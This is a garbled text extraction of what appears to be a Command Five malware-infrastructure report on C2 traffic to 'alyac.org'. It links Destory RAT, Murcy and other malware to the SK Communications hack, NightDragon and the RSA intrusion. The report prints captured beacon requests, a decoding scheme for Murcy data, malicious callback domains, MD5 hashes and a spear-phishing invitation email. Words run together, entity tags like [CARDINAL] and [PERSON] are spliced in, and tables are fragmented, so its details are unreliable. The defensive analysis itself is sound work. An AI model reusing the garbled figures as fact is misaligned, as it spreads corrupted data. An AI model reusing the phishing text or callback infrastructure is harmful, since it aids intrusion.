LTD.ALLRIGHTSRESERVED.PAGE6OF \t [CARDINAL] 29POST /update?id=3109c2a2 HTTP/1.1 Accept : * / * X - Session : 0 X - Status : 0 X - Size : 61456 X - Sn : [CARDINAL] 1 User - Agent : [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [CARDINAL] 6.0 ; [EVENT] Windows [EVENT] NT [EVENT] 5.1;SV1 ; Host : path.alyac.org Content - Length : 0 Connection : Keep - Alive Cache - Control : no - cache Cookie : VisitorID = bd5ab197 - 355d-42cb - ae1b- 8d23f1dd55ed&Exp=9/25/2014 6:03:33 AMFIGURE4 : VARIANTBCOMMUNICATIONS The format \t of \t Variant A is \t identical to the communicationsgenerated \t by \t theDestoryRAT \t used in the SK Communications hack26 . \t The format \t of Variant B is generated \t by \t malwarethat \t usesthecallbackdomain \u2018 gm1.network sec.net\u201927 . asJanuary \t [CARDINAL] 200728and \t hasbeenusedinseveralmajor 26Foradetailed \t analysis \t oftheDestoryRATused \t intheSK [PERSON] Communicationshack \t ( including \t acompletelistofdeobfuscated strings)refertotheCommandFivepaper\u2018SKHack \t byanAdvanced PersistentThreat\u2019.(Command \t FivePtyLtd,2011 ) [CARDINAL] 27Malware detected as \u2018 Troj_Inject . [ORG] AMR \u2019 submits HTTP \t [ORG] POST requests \t to\u2018gm1.network sec.net/update?id={value}\u2019.Thedomain \u2018 gm1.network sec.net\u2019is \t aknowncallbackofmalwaredetectedas Backdoor : Win32 / Thoper . A.(Mendoza,2011)(Wong,2011 ) 28TheDestoryRATwith \t MD5 \t hash\u201870CDC9A2 \t D9CC276B \t C5D1 D47D21FB \t 24DF \u2018 \t wascompiled \t on3 \t January2007.Cookie \t StealingCookiesweresentwiththeHTTPPOSTrequestsfrom allbut \t threeIPaddresses . Acookienamed\u2018VistorID \u2019 waspresent \t any \t timeacookiewassent . \t Onoccasion a\u2018Yahoo \u2019 , \t \u2018 [LOC] SessionId\u2019and / or\u2018fcVal\u2019cookiewasalso present \t intherequests . [NORP] Thetransmissionofthese cookiescould \t facilitatesessionstealingand , inthe case of the [ORG] Yahoo cookie , enable unauthorised webmailaccess . Each \t VisitorID \t cookiecontainedanexpiry \t time [TIME] between [TIME] 9/25/2014 [TIME] 5:50:03 \t AM and \t 9/25/2014 6:14:17 \t AM . \t [PERSON] Theexpiry \t timeis \t uniqueforeach \t victim and \t remainedconstant(pervictim ) \t acrosstheHTTP POST \t requests . \t Itis \t possiblethevictims \t received \t the cookie from \t a C2 server with which \t they \t had previously \t communicated , \t or , \t from \t aserverhosting \t a webpagethatcaused \t theinitialinfection . Itis \t also possiblethat \t thecookie , and \t thepropinquity \t of \t the timesinthecookies , \t iscoincidental , \t andthat \t the victims \t receivedthecookiefrom \t otherlocations . Multiple [NORP] Chinese IP addresses were observed submitting HTTP GET to the host requests \u2018 path.alyac.org \u2019 . Data communicationsindicated \t that \t therequestswereall sent \t from \t a single computer , \t and \t therefore that computerwasnot \t using \t astaticIP \t address . Thedatafrom \t thecomputerwascarriedinthe requestsinanencoded \t form \t ( asdescribed \t below ) withinaHTTPheadernamed \t \u2018 Extra Data \u2019 . \t [CARDINAL] Two \t other uniqueheaderswerealso \t present \t intherequests ; [ORG] The \u2018 [ORG] Extra [ORG] Data Space [ORG] \u2019 . and \u2018 [PRODUCT] Extra [PRODUCT] Data Bind [PRODUCT] \u2019 communicationsappearto \t begeneratedbymalware knownas\u2018Backdoor . Murcy\u2019that \t is \t reportedly \t not \t in widespread \t use32 . \t Anexampleof \t anactualHTTP \t GET requestis \t showninFigure5.THE \u2018 MURCY \u2019 COMMUNICATIONSGET /150828 HTTP/1.0 Connection : Keep - Alive Accept : * / * Host : path.alyac.org User - Agent : [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [CARDINAL] 6.0 ; Windows NT [CARDINAL] 5.1 ) [ORG] Extra - [ORG] Data - Bind : DE6A34D80D43B930 Extra - Data - Space : [CARDINAL] 65536 Cache - Control : no - cache Pragma : no - cache Content - Length : [CARDINAL] 0FIGURE5 : SAMPLEOFMURCYCOMMUNICATIONS The path \t in the HTTP GET \t requests is \t the computer\u2019stickcount(i.e.thenumberofmilliseconds sincethesystemwasstarted ) . \t Therequestsfrom \t the victim \t occurred \t approximately \t every \t [TIME] 11 [TIME] seconds whenthecomputerwasturned \t on . \t Accordingly , \t the numberintheURI \t increasedbyapproximately \t [CARDINAL] 11000 each \t request . Where there was a break in the communications(presumably \t dueto \t thecomputer being \t shut \t downorrebooted ) , \t thecounterreset \t and was [DATE] between [DATE] 128703 \t and \t [DATE] 133243 \t in the next communication . This indicates that computer within [TIME] minutes of \t the computer being booted . Theencoded \t [NORP] datawithinthe\u2018Extra [NORP] Data\u2019header canbedecoded \t using \t thestandard \t Base64alphabet but \t with \t modified \t bit \t placement . \t The standard [PERSON] Base64 \t algorithm \t decodes encoded \t strings using consecutivebitsread \t left \t toright \t i.e. \t bits0 7 \t would formthefirst \t decodedbyte(showninFigure6).For Murcycommunications , \t theinputbits \t that \t formeach output \t byte are not \t taken contiguously . \t Figure [CARDINAL] 7 describes how \t the [ORDINAL] first \t [CARDINAL] three decoded \t bytes are constructed , and can be used to implement a decoding \t algorithm.from32SymantecCorporationassessesthenumberofBackdoor . Murcy infections \t tobelessthan50.(Ward,2011)COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.PAGE7OF \t [DATE] 29895 some input data sizes a crude , but For functionally \t equivalent , approach \t istoreversethe inputbytes , \t apply \t astandard \t Base64decoding , \t and thenreversetheoutput \t bytes . Thedecoded \t string \t containscommunicationsof \t a format \t hereonreferred \t toasthe\u2018IP2B \u2019 \t protocol . \t All observed \t IP2Bcommunicationsbeganwith \t a16 \t byte [CARDINAL] 0x12345678 \t and \t 0x10001000 , \t and \t thesizeof \t the data . \t Thedecoded \t versionof \t theMurcy \t \u2018 Extra Data \u2019 stringfrom \t Figure5is \t showninFigure8.The decoded data reveals the name of \t the compromised \t computer , that \t thecomputeris \t running WindowsXP \t ServicePack3,its \t internalIP \t addressis its screen resolution is set to [CARDINAL] 1920x1080and \t that \t its \t locale33is \t \u2018 [NORP] Chinese China \u2019 . \t A [ORG] Protocolidentifier . \u20180x12345678\u2019in IP \t address . [NORP] Valueisbig endian . IP \t address . [NORP] Valueisbig endian . Vertical \t screenresolution(pixels ) . Tick \t count . [PERSON] Valueis \t identical \t tothat [WORK_OF_ART] Ident [WORK_OF_ART] Anullterminated \t [CARDINAL] 2 bytewide characteridentifierstring . SPack \t  Anull terminated \t [CARDINAL] 2 byte widecharacterstring \t indicating \t the UName Anullterminated \t 2 byte CName \u2013 Anull terminated \t 2 byte * ALL \t VALUES \t ARE \t LITTLE ENDIAN \t UNLESS \t OTHERWISE \t STATED . [CARDINAL] 33A locale is a collection of language related user preference informationthattypicallyidentifies \t auser \u2019s \t countryand \t dialect . ( MicrosoftCorporation,2011 ) 34For a list oflocaleidentifiers \t refertotheMicrosoftMSDN referencepage.(MicrosoftCorporation,2011 ) COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.containing78 56 34 12 00 10 00 10 DA 00 DA 00 ; [ORG] xV4 00 00 00 00 18 09 07 20 C0 A8 84 82 ; C0 [CARDINAL] A8 84 82 F0 FD 07 00 54 0D 00 00 ; T [DATE] 80 [DATE] 07 [DATE] 00 00 38 04 00 00 04 08 00 00 ; [CARDINAL] 8 [CARDINAL] 2C 4D [CARDINAL] 02 00 05 00 00 00 01 00 00 00 ; , M [CARDINAL] 28 0A 00 00 02 00 00 00 [CARDINAL] 4C 00 00 00 ; ( L 8A 00 00 00 [CARDINAL] A8 00 00 00 AA 00 00 00 ; B8 00 00 00 D8 00 00 00 38 00 33 00 ; [CARDINAL] 8.3 . [CARDINAL] 37 00 42 00 xx xx xx xx xx xx xx xx ; [CARDINAL] 7.B.xxxxxxxx xx xx xx xx xx xx xx xx xx xx xx xx ; xxxxxxxxxxxx xx xx xx xx xx xx xx xx xx xx xx xx ; xxxxxxxxxxxx xx xx xx xx xx xx xx xx xx xx xx xx ; xxxxxxxxxxxx xx xx [CARDINAL] 36 [CARDINAL] 00 39 00 31 00 00 00 53 00 ; [PERSON] xx6.9.1 [PERSON] S. [CARDINAL] 65 00 72 00 76 00 69 00 63 00 65 00 ; e.r.v.i.c.e . [CARDINAL] 20 [CARDINAL] 00 [CARDINAL] 50 00 61 00 63 00 6B 00 20 00 ; .P.a.c.k . . [CARDINAL] 33 00 00 00 00 00 53 00 59 00 53 00 ; [CARDINAL] 3 S.Y.S. 54 00 45 00 4D 00 00 00 57 00 4F 00 ; T.E.M W.O. [CARDINAL] 57 00 2D 00 45 00 38 00 45 00 xx xx ; [PERSON] W.-.E.8.E.xx xx xx xx xx xx xx xx xx xx xx xx xx ; xxxxxxxxxxxx [DATE] 36 [DATE] 00 [DATE] 00 00 00 00 ; [CARDINAL] 6 FIGURE [CARDINAL] 8 : EXAMPLE OF DECODED MURCY DATA STRINGPAGE8OF \t 29IP2B ProtocoltheTHE \u2018 OSCAR \u2019 PROTOCOLdata wasTHE \u2018 BB \u2019 PROTOCOLThedatasent \t to \t theC2 \t serveris \t dependent \t on theC2instructionsreceived . \t [GPE] Commands \t [GPE] theMurcy malwarereportedly \t understands \t areshowninAnnex [NORP] D. \t ( SafeZoneCast , \t [DATE] 2011 ) The [PERSON] Murcy malware is commonly named \u2018 cydll.dll \u2019 , \t creates a mutual exclusion ( mutex35 ) handlenamed \t \u2018 Cy1.0Mutex \u2019 , \t and \t installsaservice named\u2018CyService\u2019with \t adisplay \t nameof \t \u2018 CyService Service \u2019 . \t It \t also \t commonly \t gains persistence by % System%\\cydll.com\u2019inthe\u2018ControlSet001\u2019keyin Backdoor . Murcy on [DATE] 31 \t [DATE] July \t [DATE] 2011 , \t yet \t the same malware appears to \t have been [ORDINAL] first \t detected \t by Kaspersky \t Lab on [DATE] 11 [DATE] January \t [DATE] 201036 . \t [PERSON] Malware sampleswith \t thesameattributesdatebackto \t at \t least October 200937 . This suggests that the [PERSON] Murcy malwarehasbeeninuseforat \t least \t [DATE] two \t [DATE] years . [GPE] Known [GPE] Murcy malware uses \u2018 albertstein.ddns.us \u2019 \u2018 alvington.jetos.com\u201939 , \t \u2018 ftp.xmahone.ocry.com\u201940 , \t and 38 \u2018 superaround.ns02.biz\u201941 . \t These callback domains wereallalso \t reportedly \t used \t intheMarch \t [DATE] 2011 intrusionintoRSA\u2019snetwork . \t [PERSON] Thatintrusionresulted inthetheft \t of \t informationrelated \t to \t RSA\u2019sSecurID authentication products . The informationwaslaterused \t to \t enabletargeting \t of defence contractors . ( Coviello , \t [DATE] 2011 ) . \t ( [PERSON] Rasmussen , 2011)(US [ORG] CERT , \t [DATE] 2011 ) . 35Amutexisatechnical \t constructused \t tocontrolaccesstosystem resources . Inthis \t casethetechnicalmeaning \t is \t lesssignificantthan thefactthatthemutexintheMurcymalwareis \t uniquelynamed . 36Malwarethatfits \t theprofileofMurcymalwarewas \t detected \t on 11January2010as \t \u2018 Backdoor . Win32.Agent.anvj\u2019.(KasperskyLab ZAO,2010 ) 37Malwaredetected \t in2009withtheMD5 \t hashes\u20183FDEA18B 9610CBC9B63B \t A7A44899FBFB\u2019and \t \u2018 [CARDINAL] 42E8163B7F08DD38 3E62 E4BD B7F0 7C08 \u2019 \t is known to callback \t to [ORG] IP address 38MalwarewiththeMD5 \t hashes\u201819B0 \t 227B \t EC75BEF9 \t 3C6C CC549B6D2BA0 \u2019 \t and \t \u2018 3DF0D0AB \t 4AD9 \t DA4559A1 \t C646 \t 4C85 26D1 \u2019 \t callback \t tothedomain\u2018albertstein.ddns.us\u2019.(GFISoftware , 2010)(Sandbox,2010 ) 39Malwarewith \t theMD5hashes \t \u2018 91A2 \t 68B317D2 \t CC65 \t 69B8 5BB0 \t [CARDINAL] 3A5F \t F841 \u2019 \t and \t \u2018 69ED8F7B \t 0046956045A9 \t 0E36 \t E3C8 3F6A \u2019 \t callback \t to the domain \u2018 www.alvington.JetOS.com \u2019 . ( GFI SandBox,2011)(SunbeltSecurity,2010 ) and \t \u2018 9ADDC6D5 \t [CARDINAL] 7330 \t [DATE] 9399 \t E2B8 \t [CARDINAL] 7887 \t 3A00A921 \u2019 \t callbacktothe domain\u2018ftp.xmahone.ocry.com\u2019.(GFISandbox,2011)(Telus,2011 ) ( ThreatExpertLtd,2011)(GFISandbox,2011 ) 41Malwarewith \t MD5 \t hash\u20183740 \t 5D5B \t CF64FB95 \t 47CACDA9 5F4CE8B4\u2019is \t knowntocallbackto\u2018www.superaround.ns02.biz \u2019 . ( GFISandbox,2010)Numerouscomputerswereobserved \t communicating with \t an\u2018alyac.org\u2019subdomainonTCP \t port \t [CARDINAL] 80 \t viathe \u2018 Oscar\u2019protocol . Most , but \t notall , \t ofthecomputers also \t communicated to the same domain via the \u2018 Update?\u2019communications . \t [NORP] Theprotocolis \t believed to be associated with the same malware that producesthe\u2018Update?\u2019communications \u2013 theDestory RAT.Each \t compromisedcomputercommunicated \t at \t a different \t intervalto \t theothers , \t and \t accordingly , \t the malware on each \t of \t the compromised \t computers appearstohavebeenindividually \t configured . \t For example , \t [CARDINAL] one computer communicated [TIME] every [TIME] 12 [TIME] seconds \t and \t anotherevery \t [TIME] 16 \t [TIME] seconds . communication . Thelengthof \t theencrypteddatain each \t packet \t varied \t between16 \t bytesand89 \t bytes . Aftersending \t theencrypted \t datathemalwarewaited \u2018 update.alyac.org\u2019viathe\u2018BB\u2019protocol . \t [PERSON] Oneof \t the computersused \t aChineseIP \t address , \t theothera [LOC] South \t KoreanIP \t address . \t The\u2018BB\u2019protocolhasa21 byteheadercontaining \t a4byteXORkeythat \t canbe usedtodecodetheremaining \t bytesinthepacket . The packet \t format \t isdescribed \t inTable5 . SizeBB Sizeinbytes \t ( including indicator . \u20180x010x000x000x00\u2019inall Unknown . \u20180x010x040x010x00\u2019inall Unknown . \u20190x00\u2019inallobserved Dataencoded \t using \t the4 \t byteXORkey [ SizeBB ] specified \t inbytes \t 12 15 . * ALL \t VALUES \t ARE \t LITTLE ENDIAN \t UNLESS \t OTHERWISE \t STATED . TABLE5:'BB'PROTOCOLPACKETFORMAT COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.PAGE9OF \t 29THE \u2018 DB \u2019 PROTOCOLaboutAftersending \t thebasicbeacon , \t thecompromised computerswaitedforaresponsefromtheserver , then closed the connection when they had \t not received \t a response from the server within [TIME] five [TIME] seconds . Both \t ofthecompromised \t computersreattempted the communications [TIME] approximately [TIME] every [TIME] eight [TIME] seconds . Onsomedaysthehighfrequency \t of \t the Asinglecomputerwasobserved \t communicating \t with thedomain\u2018update.alyac.org\u2019viathe\u2018DB\u2019protocol . The communications originated from the same [PERSON] Chinesecomputernetworkasoneof \t the\u2018BB\u2019victims but \t fromadifferent \t computeronthat \t network . \t It \t is not known what malware generates that \t generatesthe\u2018BB\u2019communications . The communications reveal detailed \t OS and revealsthat \t thecompromised \t computeris \t running Windows2003ServerServicePack2.Thedetailed system \t information revealsthat \t thecompromised computerhasanIntelPentium \t Pro classprocessor , [CARDINAL] four logical processors and \t an [ORG] LGA 77542Central Processing \t Unit \t ( CPU)socket . TABLE6 : SUMMARYOFFIRST202BYTESOFA\u2018DB \u2019 PACKETThe DB communications typically \t occurred \t at intervalsof \t between4 \t and \t 92 \t seconds , however , sometimes they were much \t further apart . After sending \t thedetailedbeaconto \t thecommand \t and controlserver , \t thecompromisedcomputerappeared to \t expect \t aresponsefromtheserver . informationindicatesthecomputerhas \t anLGA775 \t [GPE] CPUsocket ( [ORG] Intel \t family6 / model \t [CARDINAL] 15 / stepping \t [CARDINAL] 11).(MicrosoftCorporation , 2011)(Wikipedia ) 43Onseveraloccasionsthe4bytes \t \u2018 70170000 \u2019 \t wereprepended tothecommunications.combined processorSIZE [CARDINAL] 10and processortheseTHE \u2018 QDIGIT \u2019 PROTOCOLFREQUENCY OF \t COMMUNICATIONSis assumedOnecomputerusingastaticSouthKoreanIPaddress wasobserved \t sending \t thefivebytes0x510x31 \t 0x39 0x21 \t 0x00 \t ( \u201c \\x51Q19 ! \u201d ) \t to \t \u2018 update.alyac.org\u2019onTCP port \t [CARDINAL] 80 \t up \t to \t nearly \t 800timesaday . \t Whilethe communicationsdid \t not \t occur \t continuously \t ( likely dueto \t thecomputerbeingturned \t off ) , \t whentheydid occur \t a new \t connection was attempted , and \t the packet \t containing \t \u2018 Q19!\u2019sent , \t approximately \t every generated by \t malware but it \t is \t not \t known what malware , \t or which \t other callback domains that malwareuses . Themalwareappeared \t toexpect \t a responsefrom \t theserverafterit \t senteach \t packet . to \u2018 alyac.org \u2019 computer . Asummary \t oftypicalobserved \t intervals betweencommunications , \t brokendownby \t protocol , is \t showninTable7 . TYPICAL \t BEACON \t INTERVAL * [CARDINAL] 1 \t [CARDINAL] to13,12\u00b13,16,104\u00b13or200 \t \u00b115 12\u00b12,13,15,16,(55or155\u00b15),(7.5 , \t 8.5or15 ) , [PERSON] Oscar ( 45,55 , \t 106 ) * Commas \t indicatethattheinterval \t changed \t betweenvictims . Brackets \t indicatethatavarietyofintervalswereobserved \t from ThesingleLURK \t victim \t wastypically \t observed beaconingat \t [CARDINAL] 26second \t intervals , \t theMurcy \t victimat [CARDINAL] 11 \t [ORDINAL] second intervals , \t and the [ORG] Qdigit victim at [TIME] 60 [TIME] second \t intervals . \t [PERSON] Allof \t theX ShellC601 \t victims \t were typically \t observedbeaconing \t at \t 36second \t intervals , and \t the [ORG] BB victims \t at \t [TIME] 8 [TIME] second \t intervals . \t The beaconing interval of the other victims \t does not appearto \t beafixed \t time , \t and \t instead \t adegreeof randomnessappearstobeemployed . COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.PAGE10OF \t [CARDINAL] 29Ports usedASSOCIATION WITH \t MALWARE AND [ORG] ATTACKSPORT alloccurred \t onTCP \t port \t 80orTCP \t port443 \t  ports commonly \t used \t forlegitimatepurposes44 . While most \t malware uses the local [ORG] DNS \t server settingsofthecompromised \t computertoresolveits callbackdomainto \t anIP \t address , \t insomeobserved the attackers appear specifically \t chosentheDNS \t servers . ThemajorityofX ShellC601 \t malwarethatcalled back to \t \u2018 path.alyac.org \u2019 used \t Google DNS servers , presumably \t instead \t of the [ORG] DNS settings on the compromised \t computers . \t TheX ShellC601 \t malware supportsuseof \t aspecified \t [ORG] DNS \t serverto \t resolve callbackdomains , \t and \t it \t appearstheattackershave madeuseof \t thisfunctionality . The\u2018Update ? \u2019 , \t [PERSON] Oscar , \t [PERSON] Murcyand \t [ORG] Qdigit \t victims \t all appearto \t haveused \t theirlocalDNS \t serversettingsto resolvethecallbackdomains . \t [PERSON] Ontheotherhand , \t the single LURK victim \t used \t Google DNS \t servers to resolveits \t callbackdomain , \t asdidtheChineseBB victim \t ( and \t associated \t DBvictim ) \t but \t not \t theSouth KoreanBBvictim . \t This \t suggeststhat \t theLURK , \t [GPE] BB and \t DB malware may \t also \t have the same [ORG] DNS functionality \t asX [ORG] Shell , \t althoughit \t is \t possiblethat thevictimsareconfiguredto \t usetheGoogleservers astheirregularDNS \t servers , \t and \t that \t themalwareis not \t using \t different \t servers . 44TCPports \t 80 \t and \t 443arecommonly \t used \t forlegitimateHTTP and \t HTTPSactivityrespectively , and \t as \t such \t communications \t to theseports \t areoftenallowedthrough \t firewalls . Theobservedcommunicationshavelinkstoavariety of \t malwareand \t to \t anumberof \t attacks , \t asillustrated inFigure9 , \t and \t detailedbelow . The \u2018 Update ? \u2019 communications and \t the [PERSON] Oscar communicationsarebothassociated \t withtheDestory RAT \t familyofmalware . Thismalwarefamily \t hasbeen used \t inanumberof \t targeted \t attacksincluding \t the July \t 2011 \t [ORG] SKCommunicationshack . \t [GPE] Throughshared infrastructurethemalwarehaslinkstotheseriesof coordinated , covert and targeted cyber attacks dubbed \t \u2018 NightDragon\u201945 , \t and \t also \t to \t therecent \t series of targeted attacks that have used RAT \t malwarealso \t haslinksto \t socially \t engineered emailsincluding \t thosethattargeted \t expertsonthe relationship \t of \t theUnited \t Stateswith \t [GPE] Japan , \t [GPE] China and \t [GPE] Taiwan . TheDestoryRAT \t isalso \t connectedto LURK \t malware via a compromised \t code signing certificatewhich \t wasusedto \t signboth \t piecesof malware , andtoIP2Bcommunicationsby \t ashared callbackdomain . The X ShellRAT has been used in numerous attacksbut \t many \t of \t theseattacksarenot \t expected \t to beassociated \t with \t thesameattackers . Ontheother hand , \t thecallbackdomainsused \t [ORG] byMurcymalware suggest \t that \t themalwareisused , \t perhaps \t solely , \t by [ORG] IP addresses , to which \u2018 alyac.org \u2019 and its the subdomains previously pointed , associate domain , andtheattackersbehindit , witharaft \t of activity . \t This \t includes activity \t involving \t callback domainsregistered \t toappearasthoughthey \t were associated with legitimate , trusted entities , and domainsregistered \t to \t a\u2018LeeCooper\u2019that \t tiebackto 45The [ORG] NightDragon series of attacks \t began in , or prior to , [DATE] November [DATE] 2009 and targeted global \t oil and petrochemical companies.(McAfeeFoundationProfessionalServices \t andMcAfee Labs,2011 ) 46Sykipot is a family \t of malware used since [DATE] 2007 to steal intellectualproperty . Themalwarehasbeenusedinaseriesof sociallyengineered \t emailcampaigns \t againstavarietyofsectors . Onanumberofoccasions , [DATE] theattackershaveexploitedzeroday vulnerabilities \t to install the the malware . Some variants \t of malware include features \t that enable \t it to hijack \t smartcards . ( Thakur,2011)(Lelli,2010)(Blasco,2012 ) COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.NAME \t SERVERSPAGE11OF \t 29SK Communications hack*.duamlive.com sec.netTargeted \t emails pu.flower show.org www.mailsignin.net 123.netwww.adv138mail.com newhose.ntimobile.com sms.servegame.com way.com*.newcarstyle .comSykipotFIGURE9 : ILLUSTRATIONOFLINKSSeveral \t targeted [GPE] BB \t [GPE] protocol*.mail [GPE] kr2.com COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.IP2B malware wow.travlman.com [ORG] PAGE12OF \t [CARDINAL] 29*.topix21 century.comro.diggfunny.com bbs.ezxsoft.com\u2018LeeCooper \u2019 malware*.windowupdate.orgpc.nprotects Trojan . Win32.Generic .ddns.usNightDragonSocially \t Engineered Emailsnamed thecallbackdomain\u2018vupdate.mail kr2.com\u201947 , \t while NightDragonmalwareis \t knownto \t communicatewith \u2018 ma2.mail kr2.com\u201948and \u2018 www2.mail kr2.com\u201949 . The communications sent to \t \u2018 www2.mail kr2.com \u2019 similar [CARDINAL] 50 , but not activity . \t Other \u2018 mail [ORG] kr2.com [ORG] \u2019 subdomains include \u2018 sa****.mail kr2.com \u2019 , \u2018 cb85.mail kr.com \u2019 , and \u2018 skylie.mail kr2.com \u2019 \t   at \t least \t [CARDINAL] two of \t which \t are knowntobeassociatedwithmalware51 . Destory \t RAT \t malware is known to \t use the callback domain \u2018 bbs.afbjz.com\u201952 , while known [ORG] NightDragon malware uses the callback domain \u2018 blog.afbjz.com\u201953 . \t Asof \t [CARDINAL] 3 \t February \t 2012,bothofthe This \t overlap in infrastructure appears to be of particular significance given the following Asof \t 6February2012,thedomains\u2018gmail.mail   ru2.com \u2019 , \u2018 mail ru2.com \u2019 , \u2018 live.mail ru2.com \u2019 , \u2018 usaisbig.oerco.com \u2019 , \u2018 [PERSON] msn.mail ru2.com [PERSON] \u2019 , \u2018 www.afbjz.com \u2019 , \u2018 whois.oerco.com \u2019 , and \u2018 www2.oerco.com \u2019 otherwiseknowntobeassociated \t with \t malware54 . 47TheDestoryRATwith \t MD5 \t hash\u201895558985D211 \t F768 \t 1ACC 1AC9 [PRODUCT] 2DCB [PRODUCT] 07C8 A096 B403 \u2019 uses the callback location \u2018 vupdate.mail kr2.com \u2019 . 48MalwarewithMD5 \t hash \t \u2018 2D8A9038E151FB30D45EA866 [WORK_OF_ART] 8AFD \t [WORK_OF_ART] 2A8E\u2019,knowntocallback \t to\u2018ma2.mail kr2.com\u2019,is \t detected byantivirus \t softwareas \t \u2018 TrojanDropper : Win32.RedSip . A\u2019,analias forNightDragonmalware.(ThreatExpertLtd . ,2010 ) ( [PERSON] Hispasec [PERSON] Sistemas,2011)(Kurc,2011 ) 49MalwarewithMD5hash\u20185BC597E48270F04EC9B68343 [DATE] 2432 E352 \u2019 , known to call back \t to \u2018 www2.mail kr2.com \u2019 , is detected \t byantivirussoftwareas \t \u2018 Backdoor : Win32 / [PERSON] RedSip . A!svc \u2019 , an alias \t for [ORG] NightDragon malware . ( [ORG] Sunbelt [ORG] Security , [DATE] 2010 ) ( HispasecSistemas,2010 ) [CARDINAL] 50Both \t communications \t beginwith \t a16byteheadercontaining \t the protocolidentifier\u20180x12345678 \u2019 \t and \t adatasize , and \t thedatain both \t contains \t similarsysteminformationbutinadifferentorder . [CARDINAL] 51Maliciousfiles \t areseparately \t knowntoattemptcommunications with\u2018sa*****.mail kr2.com \u2019 \t onTCP \t port8000,and \t \u2018 cb85.mail   kr2.com \u2019 \t onTCP \t port6543 . \t ( DoctorWeb,2011)(SunbeltSecurity , [DATE] 2011 ) 52The domain \u2018 bbs.afbjz.com \u2019 \t is a known callback domain of DestoryRATmalwarethatis \t detected \t byantivirussoftwareas both \t Backdoor : Win32 / Thoper . Aand \t Backdoor . [GPE] Sogu.(Wong , \t [DATE] 2011 ) ( Mullaney,2011 ) 53The domain \u2018 blog.afbjz.com \u2019 \t is \t a known callback \t domain of [ORG] NightDragonmalwarethatisdetectedbyantivirussoftwareas \u2018 [ORG] Trojan . Dropper : Win32 / [GPE] Redsip . A\u2019.(Kurc,2011 ) \u2018 Trojan . DownLoader4.8565 \u2019 communicates us****ig.oerco.comonTCPport100.(Dr . Web,2011 ) PAGE13OF \t [CARDINAL] 29 COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.The\u2018oerco.com\u2019domainis \t registered \t to \t thesame personas\u2018afbjz.com\u201955 , \t associating \t thetwodomains with \t a single entity . \t The \u2018 mail ru2.com \u2019 domain appearsto \t beassociated \t with \t thesameentity \t asthe \u2018 mail kr2.com\u2019domainusedby \t [ORG] NightDragonmalware and \t theDestroyRAT \t ( asdescribed \t above ) . \t Whilethe domainswereregisteredusing \t different \t details , \t they wereregistered \t onthesameday \t through \t thesame domainnameregistrar , \t and \t therecords \t laterupdated minutesapart56 . \t This \t suggeststhat \t allC2 \t activity involving Therecently \t expired \t domain\u2018todaygonever.com \u2019 also \t previously \t pointed \t to \t thesameIP \t address . \t As is directly associated with \u2018 todaygonever.com \u2019 malwareand \t haslinksto \t therecent \t seriesof \t [ORG] Sykipot pointed \t to \t the same [ORG] IP \t address and \t were likely associated \t withthesameattackers . Other Destory RAT callback domains are also otherwiselinkedtomaliciousactivity . \t Forexample , the callback domain ' www.adv138mail.com'57was used \t by \t a Poison Ivy \t RAT58sent \t in a [DATE] July \t [DATE] 2011 socially \t engineered \t email campaign . The emails Agenda.pdf [EVENT] \u2019 , which [GPE] Vulnerabilitiesand \t Exposure(CVE)number2010   288359to \t installthePoisonIvyRAT . \t [ORG] Acleandecoy [ORG] PDFfilewasshowntotheuserwhentheattachment wasopened . Acopy \t of \t thetext \t usedinthesocially 55Both \t domains \t areregisteredtoapersonwhosecontactemail addressis \t \u2018 madconnon@126.com\u2019 . Thenameand \t addressdetails areidenticalforboth \t domainregistrations . 56Thedomain\u2018mail kr2.com \u2019 \t was \t lastmodified \t on24February 2012 at [DATE] 1:40:32 , while \t the domain \u2018 mail ru2.com \u2019 \t was \t last modified on [DATE] the [DATE] same [DATE] day at 1:43:53 . Both \t domains were registered \t through \t [DATE] 35 \t Technology \t Co. ,Ltdon8March \t [DATE] 2010 . 57Thedomain\u2018www.adv138mail.com \u2019 \t is \t listed \t as \t [ORG] aBackdoor . [PERSON] Sogu [PERSON] callback.(Mullaney,2011 ) [CARDINAL] 58ThePoisonIvyRATis \t anadvanced \t remoteadministrationtool forWindows . Both \t freeand \t paid \t versionsoftheRATareavailable . ( shapelessn.d . ) 59CVE2010 [CARDINAL] 2883refers \t toaparticularvulnerabilityincertain versions \t ofAdobeReaderand \t Acrobatwhichanattackercanuseto take \t control \t ofaffected \t [PRODUCT] Windows , [ORG] Macintosh \t and \t UNIXsystems . ( AdobeSystemsIncorporated \t 2010 ) [CARDINAL] 60Email \t courtesyofMila \t Parkourof\u2018contagiodump.blogspot.com \u2019 . ( Parkour2011)is detected byDear < recipient>,Dear Sir / Madam , willbeits Implications forThe Sasakawa Peace Foundation would like to extend to you an invitation to be our guest speaker at [FAC] the America \u2019s [FAC] Strategic [FAC] U.S.- Japan Alliance . As you know , [ORG] the [ORG] Sasakawa [ORG] Peace [ORG] Foundation is interested in [ORG] the [ORG] U.S.- [ORG] Japan [ORG] Alliance Since you are familiar with the field , we interesting to us . please find enclosed further details , we would appreciate having acceptance soon so we may complete our agenda.youryour \ufffd < purported sender > FIGURE10 : TEXTOFASOCIALLYENGINEERED EMAILASSOCIATEDWITHWWW.ADV138MAIL.COM The domain \u2018 www.adv138mail.com \u2019 is also associated with malware detected by antivirus software as \u2018 Backdoor . Win32.Delf.abow\u201961 . Other knownsubdomainsinclude : \u2018 asm.adv138mail.com \u2019 , \u2018 dns.adv138mail.com \u2019 , \u2018 ftp.adv138mail.com \u2019 , \u2018 ihi.adv138mail.com\u201962 , \u2018 nov.adv138mail.com \u2019 . Thesedomains(withthepossibleexceptionof the\u2018dns\u2019and\u2018ihi\u2019subdomains)haveallpointedtothe same infrastructure63as the domains \u2018 pu.flower   show.org \u2019 and \u2018 www.mailsignin.net \u2019 . That \t shared infrastructureis \t knownto \t havebeenused \t tosend 